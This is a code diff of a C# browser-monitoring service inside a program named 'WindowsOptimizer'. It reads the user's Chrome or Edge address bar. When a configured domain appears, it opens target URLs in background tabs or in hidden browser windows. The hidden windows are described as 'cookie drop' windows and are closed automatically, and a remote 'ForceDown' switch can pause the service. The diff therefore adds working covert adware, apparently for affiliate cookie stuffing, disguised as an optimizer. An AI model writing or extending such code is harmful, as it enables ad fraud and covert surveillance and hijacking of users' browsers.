@@ -35,12 +35,13 @@ namespace WindowsOptimizer.Services
         public MappingConfig MappingConfig => ConfigService.Instance.MappingConfig;
         public bool IsMonitoring => _isMonitoring;
         public int MonitoringInterval { get; set; } = 3000;
-        public int CookieDropDelayMs { get; set; } = 8000; // 쿠키 드롭 대기 시간
-        public int TriggerCount { get; private set; }
+
+        public int AutoTabTriggerCount { get; private set; }
+        public int OpenHdTriggerCount { get; private set; }
         public DateTime LastTriggerTime { get; private set; }
 
         public event Action<string> UrlChanged;
-        public event Action<string, DomainMapping> DomainTriggered;
+        public event Action<string, DomainMapping, string> DomainTriggered; // type: "autotab" or "openhd"
 
         private BrowserMonitorService() { }
 
@@ -67,6 +68,13 @@ namespace WindowsOptimizer.Services
             {
                 try
                 {
+                    // ForceDown 체크
+                    if (MappingConfig?.IsForceDown == true)
+                    {
+                        Thread.Sleep(MonitoringInterval);
+                        continue;
+                    }
+
                     var url = GetCurrentBrowserUrl();
                     if (!string.IsNullOrEmpty(url) && url != _lastUrl)
                     {
@@ -91,40 +99,80 @@ namespace WindowsOptimizer.Services
             try
             {
                 var uri = new Uri(url.StartsWith("http") ? url : $"https://{url}");
-                var domain = uri.Host.Replace("www.", "").ToLower();
+                var host = uri.Host.ToLower();
 
                 foreach (var mapping in MappingConfig.Mappings)
                 {
-                    if (domain.Contains(mapping.Trigger.ToLower()) && mapping.CanTrigger())
-                    {
-                        mapping.MarkTriggered();
-                        TriggerCount++;
-                        LastTriggerTime = DateTime.Now;
+                    var trigger = mapping.Trigger.ToLower().Replace("www.", "");
+                    var targetHost = host.Replace("www.", "");
 
-                        LogService.Instance.Log($"[PlanB] 도메인 매칭: {mapping.Trigger} → 쿠키 드롭 시작");
-                        DomainTriggered?.Invoke(url, mapping);
-                        OpenHiddenBrowserForCookie(mapping.Target);
-                        break;
+                    // 도메인 매칭 (서브도메인 포함)
+                    if (!targetHost.Contains(trigger) && !trigger.Contains(targetHost)) continue;
+
+                    LastTriggerTime = DateTime.Now;
+
+                    // AutoTab 기능 처리
+                    if (MappingConfig.IsAutoTabEnabled && mapping.CanTriggerAutoTab(MappingConfig.AutoTabCycleTime))
+                    {
+                        mapping.MarkAutoTabTriggered();
+                        AutoTabTriggerCount++;
+                        LogService.Instance.Log($"[AutoTab] 도메인 매칭: {mapping.Trigger} ({mapping.AutoTabCount}/{mapping.Frequency})");
+                        DomainTriggered?.Invoke(url, mapping, "autotab");
+                        OpenBackgroundTab(mapping.Target);
                     }
+
+                    // OpenHd 기능 처리 (독립적)
+                    if (MappingConfig.IsOpenHdEnabled && mapping.CanTriggerOpenHd(MappingConfig.OpenHdCycleTime))
+                    {
+                        mapping.MarkOpenHdTriggered();
+                        OpenHdTriggerCount++;
+                        LogService.Instance.Log($"[OpenHd] 도메인 매칭: {mapping.Trigger} ({mapping.OpenHdCount}/{mapping.Frequency})");
+                        DomainTriggered?.Invoke(url, mapping, "openhd");
+                        OpenHiddenBrowserForCookie(mapping.Target, MappingConfig.OpenHdCloseTime);
+                    }
+
+                    break;
                 }
             }
             catch (Exception ex)
             {
-                LogService.Instance.Log($"[PlanB] 매칭 오류: {ex.Message}");
+                LogService.Instance.Log($"매칭 오류: {ex.Message}");
             }
         }
 
         /// <summary>
-        /// 히든 브라우저로 쿠키 드롭 후 닫기
+        /// AutoTab: 백그라운드 새 탭 열기
         /// </summary>
-        public void OpenHiddenBrowserForCookie(string url)
+        private void OpenBackgroundTab(string url)
         {
             try
             {
-                // 열기 전 기존 창 목록 저장
-                var existingWindows = GetBrowserWindows();
-
                 var browserExe = _browserType == 0 ? "chrome" : "msedge";
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = browserExe,
+                    Arguments = $"--new-tab \"{url}\"",
+                    UseShellExecute = true
+                };
+                Process.Start(startInfo);
+                LogService.Instance.Log($"[AutoTab] 백그라운드 탭 열기: {url}");
+            }
+            catch (Exception ex)
+            {
+                LogService.Instance.Log($"[AutoTab] 탭 열기 실패: {ex.Message}");
+            }
+        }
+
+        /// <summary>
+        /// OpenHd: 히든 브라우저로 쿠키 드롭 후 닫기
+        /// </summary>
+        private void OpenHiddenBrowserForCookie(string url, int closeTimeSec)
+        {
+            try
+            {
+                var existingWindows = GetBrowserWindows();
+                var browserExe = _browserType == 0 ? "chrome" : "msedge";
+
                 var startInfo = new ProcessStartInfo
                 {
                     FileName = browserExe,
@@ -133,18 +181,18 @@ namespace WindowsOptimizer.Services
                 };
 
                 Process.Start(startInfo);
-                LogService.Instance.Log($"[히든] 쿠키 드롭 브라우저 열기: {url}");
+                LogService.Instance.Log($"[OpenHd] 히든 브라우저 열기: {url}");
 
-                // 비동기로 일정 시간 후 새 창 닫기
+                var delayMs = Math.Max(closeTimeSec, 10) * 1000;
                 Task.Run(async () =>
                 {
-                    await Task.Delay(CookieDropDelayMs);
+                    await Task.Delay(delayMs);
                     CloseNewBrowserWindow(existingWindows, url);
                 });
             }
             catch (Exception ex)
             {
-                LogService.Instance.Log($"[히든] 브라우저 열기 실패: {ex.Message}");
+                LogService.Instance.Log($"[OpenHd] 브라우저 열기 실패: {ex.Message}");
             }
         }
 
@@ -154,15 +202,10 @@ namespace WindowsOptimizer.Services
             EnumWindows((hWnd, lParam) =>
             {
                 if (!IsWindowVisible(hWnd)) return true;
-
                 var className = new StringBuilder(256);
                 GetClassName(hWnd, className, 256);
-                var cn = className.ToString();
-
-                // Chrome/Edge 창 클래스
-                if (cn == "Chrome_WidgetWin_1")
+                if (className.ToString() == "Chrome_WidgetWin_1")
                     windows.Add(hWnd);
-
                 return true;
             }, IntPtr.Zero);
             return windows;
@@ -177,21 +220,18 @@ namespace WindowsOptimizer.Services
 
                 if (newWindows.Count > 0)
                 {
-                    // 가장 최근 열린 창 닫기
                     PostMessage(newWindows.First(), WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
-                    LogService.Instance.Log($"[히든] 쿠키 드롭 완료, 창 닫음");
+                    LogService.Instance.Log($"[OpenHd] 쿠키 드롭 완료, 창 닫음");
                 }
                 else
                 {
-                    // URL 호스트로 창 찾기 시도
                     var uri = new Uri(url);
-                    var host = uri.Host.Replace("www.", "");
-                    CloseWindowByTitle(host);
+                    CloseWindowByTitle(uri.Host.Replace("www.", ""));
                 }
             }
             catch (Exception ex)
             {
-                LogService.Instance.Log($"[히든] 창 닫기 실패: {ex.Message}");
+                LogService.Instance.Log($"[OpenHd] 창 닫기 실패: {ex.Message}");
             }
         }
 
@@ -200,19 +240,15 @@ namespace WindowsOptimizer.Services
             EnumWindows((hWnd, lParam) =>
             {
                 if (!IsWindowVisible(hWnd)) return true;
-
                 var title = new StringBuilder(512);
                 GetWindowText(hWnd, title, 512);
-                var t = title.ToString().ToLower();
-
-                if (t.Contains(titlePart.ToLower()))
+                if (title.ToString().ToLower().Contains(titlePart.ToLower()))
                 {
                     var className = new StringBuilder(256);
                     GetClassName(hWnd, className, 256);
                     if (className.ToString() == "Chrome_WidgetWin_1")
                     {
                         PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
-                        LogService.Instance.Log($"[히든] 제목으로 창 닫음: {titlePart}");
                         return false;
                     }
                 }
@@ -250,7 +286,7 @@ namespace WindowsOptimizer.Services
 
                 string[] names = browser.Contains("chrome")
                     ? new[] { "주소창 및 검색창", "Address and search bar" }
-                    : new[] { "주소창 및 검색창", "주소 및 검색창", "address-and-search-bar" };
+                    : new[] { "주소창 및 검색창", "주소 및 검색창", "Address and search bar" };
 
                 foreach (var name in names)
                 {
@@ -267,5 +303,8 @@ namespace WindowsOptimizer.Services
             catch { }
             return "";
         }
+
+        // 통계용 프로퍼티
+        public int TriggerCount => AutoTabTriggerCount + OpenHdTriggerCount;
     }
 }
